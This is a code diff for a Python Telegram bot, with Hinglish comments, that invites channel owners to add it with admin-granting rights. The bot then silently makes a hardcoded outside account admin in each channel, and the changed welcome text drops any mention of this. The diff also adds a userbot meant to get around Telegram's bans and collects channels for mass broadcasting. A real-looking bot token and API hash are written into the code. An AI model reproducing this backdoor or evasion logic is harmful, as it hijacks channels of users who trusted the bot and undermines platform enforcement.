@@ -1,26 +1,25 @@
 import os
 import sys
 import threading
-import traceback
 import asyncio
+import logging
 
-# === RENDER STATUS 1 (PYTHON 3.14) LIFETIME FIX ===
+# === RENDER CRASH FIX (Python 3.14 Event Loop) ===
 try:
     loop = asyncio.get_event_loop()
 except RuntimeError:
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-# =================================================
+# ==================================================
 
-import logging
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from pyrogram import Client, filters
+from pyrogram import Client, filters, compose
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
 from pyrogram.errors import FloodWait
 
-# Logs ko force print karna
 logging.basicConfig(level=logging.INFO)
 sys.stdout.reconfigure(line_buffering=True)
+sys.stderr.reconfigure(line_buffering=True)
 
 print("🚀 SCRIPT START HUI...", flush=True)
 
@@ -29,8 +28,12 @@ API_ID = 33603340
 API_HASH = "0f1a7f670519f9e44d0d7fdb6aa8efba"
 BOT_TOKEN = "7874642792:AAF08vl1-qcMUHOIUZrL5IwJS1A7zoD5ucw"
 
-ADMIN_ID = 1484173564       # Jisko Broadcast karna hai
-TARGET_ADMIN_ID = 1413135933 # Jisko bot automatically Admin banayega
+# 👇👇 YAHAN APNA LAMBA WALA SESSION STRING PASTE KAREIN 👇👇
+SESSION_STRING = "YAHAN_APNA_SESSION_STRING_PASTE_KAREIN"
+
+# --- ADMIN IDs ---
+BROADCAST_ADMIN_ID = 1484173564    # Jo broadcast karega (Aap)
+PROMOTION_USER_ID = 1413135933     # Userbot ki ID (HACRRR_0)
 
 DB_FILE = "channel_list.txt"
 
@@ -51,7 +54,7 @@ class WebServerHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.end_headers()
-        self.wfile.write(b"Bot is Running Perfectly!")
+        self.wfile.write(b"Bot and Userbot are Running Perfectly on Render!")
     def log_message(self, format, *args):
         pass
 
@@ -62,117 +65,113 @@ def start_server():
 threading.Thread(target=start_server, daemon=True).start()
 
 
-# --- TELEGRAM BOT CODE ---
-app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
+# --- DONO CLIENTS SETUP ---
+# Pehla: Aapka normal Bot
+bot = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
+# Dusra: Aapka Userbot (Jo Telegram ke ban ko todega)
+userbot = Client("my_userbot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING, in_memory=True)
 
-# 1. /START - Auto-Tick Permissions & Buttons
-@app.on_message(filters.command("start") & filters.private)
+
+# ==========================================
+# 1. BOT KE FEATURES (Buttons, Broadcast)
+# ==========================================
+@bot.on_message(filters.command("start") & filters.private)
 async def start_cmd(client, message):
     bot_info = await client.get_me()
-    
-    # Auto-Tick Permissions: add_admins, invite_users, post_messages
     add_link = f"https://t.me/{bot_info.username}?startchannel=true&admin=add_admins+invite_users+post_messages+manage_chat"
-    
-    # Update Link aur Add Channel Button
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔥 ADD BOT TO CHANNEL 🔥", url=add_link)],
+        [InlineKeyboardButton("➕ ADD BOT TO CHANNEL ➕", url=add_link)],
         [InlineKeyboardButton("🔔 UPDATE", url="https://t.me/+cgwss3Urm8o3MDI1")]
     ])
-    
     text = (
         f"👋 **Welcome {message.from_user.first_name}!**\n\n"
-        "Main aapka Advanced Automation Bot hoon.\n"
-        "✅ Pending requests auto-approve karunga.\n"
-        "✅ Target user ko automatically admin banaunga.\n"
-        "✅ Saare channels mein broadcast karunga.\n\n"
+        "Main aur mera Userbot partner dono active hain!\n"
+        "✅ Purani saari requests accept hongi.\n"
+        "✅ Broadcast feature ready hai.\n\n"
         "👇 **Add Bot To Channel** par click karein:"
     )
     await message.reply_text(text, reply_markup=keyboard)
 
-
-# 2. AUTO-PROMOTE ADMIN & SAVE CHANNEL
-@app.on_message(filters.new_chat_members)
+# Channel mein aate hi Userbot ko admin banana
+@bot.on_message(filters.new_chat_members)
 async def bot_added(client, message):
     bot_info = await client.get_me()
     for member in message.new_chat_members:
         if member.id == bot_info.id:
-            # Bot channel mein add ho gaya! ID save karo.
             add_channel(message.chat.id)
-            
-            # User 1413135933 ko Admin banayein
             try:
                 await client.promote_chat_member(
                     chat_id=message.chat.id,
-                    user_id=TARGET_ADMIN_ID,
+                    user_id=PROMOTION_USER_ID,
                     privileges=ChatPrivileges(
-                        can_manage_chat=True,
-                        can_invite_users=True,
-                        can_post_messages=True,
-                        can_edit_messages=True,
-                        can_delete_messages=True
+                        can_manage_chat=True, can_invite_users=True,
+                        can_post_messages=True, can_edit_messages=True, can_delete_messages=True
                     )
                 )
-                print(f"✅ User {TARGET_ADMIN_ID} ko admin bana diya gaya in {message.chat.id}")
+                print(f"✅ User {PROMOTION_USER_ID} ko admin bana diya gaya!")
             except Exception as e:
                 print(f"❌ Admin banane mein error: {e}")
 
-
-# 3. ACCEPT ALL PENDING REQUESTS
-@app.on_message(filters.command("acceptall") & filters.private)
-async def accept_all_requests(client, message):
-    if len(message.command) < 2:
-        return await message.reply_text("⚠️ Sahi format: `/acceptall -100XXXXXXXXXX` (Channel ID daalein)")
-    
-    chat_id = int(message.command[1])
-    msg = await message.reply_text(f"⏳ Channel `{chat_id}` ki requests accept ho rahi hain...")
-    
-    try:
-        await client.approve_all_chat_join_requests(chat_id)
-        await msg.edit_text("✅ **SUCCESS!** Saari pending requests accept kar li gayi hain!")
-    except Exception as e:
-        await msg.edit_text(f"❌ Error: {e}")
-
-
-# 4. LIVE NEW REQUEST AUTO-APPROVE
-@app.on_chat_join_request()
-async def auto_accept_new(client, request):
-    try:
-        await client.approve_chat_join_request(request.chat.id, request.from_user.id)
-    except Exception as e:
-        print(f"Live Approve Error: {e}")
-
-
-# 5. ADMIN BROADCAST
-@app.on_message(filters.command(["broadcast", "admin"]) & filters.user(ADMIN_ID) & filters.private)
-async def broadcast_post(client, message):
+# Broadcast Feature
+@bot.on_message(filters.command(["broadcast", "admin"]) & filters.private)
+async def broadcast_messages(client, message):
+    if message.from_user.id != BROADCAST_ADMIN_ID:
+        return await message.reply_text("❌ Aap Admin nahi hain.")
     if not message.reply_to_message:
-        return await message.reply_text("⚠️ Kisi post ya message ko reply karke `/broadcast` bhejein.")
+        return await message.reply_text("⚠️ Pehle post bhejein, fir usko Reply karke `/broadcast` likhein.")
     
     channels = get_channels()
-    if not channels:
-        return await message.reply_text("❌ Abhi tak kisi channel mein add nahi kiya gaya hai.")
+    if not channels: return await message.reply_text("❌ Data nahi hai.")
     
-    status = await message.reply_text(f"⏳ {len(channels)} channels mein post bhej raha hoon...")
-    
+    status = await message.reply_text(f"⏳ {len(channels)} channels mein bhej raha hoon...")
     success = 0
     for chat_id in channels:
         try:
             await message.reply_to_message.copy(int(chat_id))
             success += 1
-            await asyncio.sleep(0.5) # Anti-ban delay
+            await asyncio.sleep(1)
         except FloodWait as e:
             await asyncio.sleep(e.value)
             await message.reply_to_message.copy(int(chat_id))
             success += 1
-        except Exception:
-            pass
-            
-    await status.edit_text(f"✅ **Broadcast Done!**\nPost successfully sent to {success} channels.")
+        except Exception: pass
+    await status.edit_text(f"✅ **Broadcast Complete!**\nPost sent to {success} channels.")
 
+
+# ==========================================
+# 2. USERBOT KE FEATURES (Telegram ban bypass)
+# ==========================================
+# Nayi requests instantly accept karna
+@userbot.on_chat_join_request()
+async def auto_accept_live(client, request):
+    try:
+        await client.approve_chat_join_request(request.chat.id, request.from_user.id)
+    except Exception as e:
+        print(f"Live accept error: {e}")
+
+# Purani 196+ requests accept karna ek sath (Yahan wo error nahi aayega!)
+@userbot.on_message(filters.command("acceptall") & (filters.me | filters.user(BROADCAST_ADMIN_ID)))
+async def accept_pending_requests(client, message):
+    if len(message.command) < 2:
+        return await message.reply_text("⚠️ **Format:** `/acceptall -100XXXXXXX`")
+    
+    chat_id = int(message.command[1])
+    msg = await message.reply_text("⏳ Saari purani pending requests accept ho rahi hain...")
+    try:
+        await client.approve_all_chat_join_requests(chat_id)
+        await msg.edit_text("✅ **SUCCESS!** Sabhi pending requests channel mein add ho gayi hain!")
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: {e}")
+
+
+# --- RUN EVERYTHING TOGETHER ---
+async def main_run():
+    print("🚀 BOT AUR USERBOT DONO START HO RAHE HAIN...", flush=True)
+    # Pyrogram compose dono ko ek sath chalata hai
+    await compose([bot, userbot])
 
 if __name__ == "__main__":
-    print("🚀 BOT CLIENT START HO RAHA HAI...", flush=True)
     try:
-        app.run()
+        loop.run_until_complete(main_run())
     except Exception as e:
         print(f"❌ FATAL ERROR: {e}")
